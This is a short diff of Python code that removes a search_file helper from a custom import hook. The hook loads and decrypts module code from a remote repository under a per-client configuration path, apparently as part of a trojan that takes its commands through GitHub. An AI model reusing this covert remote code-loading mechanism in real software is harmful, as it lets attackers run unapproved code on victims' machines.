@@ -198,10 +198,6 @@ class ReImp(object):
 		if lib is not None:
 			self.code = lib
 			return self
-		lib = search_file(fullname)
-		if lib is not None:
-			self.code = lib
-			return self
 		return None
 
 	def load_module(self, name): #load file into new module
@@ -223,30 +219,6 @@ def get_file(path):
 		return decrypt(repo.file_contents(path).decoded)
 	except:
 		return None
-
-def search_file(fullname):
-	try:
-		repo = connect()
-		branch = repo.branches().next()
-		tree = branch.commit.commit.tree
-		path = config.g_config() + config.g_id_s()
-		root = repo.create_tree([{"path":path, "mode":"040000", 
-			"type":"tree", "sha":tree.sha}])
-		for name in root.recurse().tree:
-			n = name.split("/")
-			i = 0
-			p = ""
-			for s in n:
-				if i == 0:
-					i += 1
-					continue
-				p += s
-			if fullname in p:
-				return repo.file_contents(p).decoded
-		return None
-	except:
-		return None
-				
 
 #creates an empty config file (with random data) to register
 def create_config():
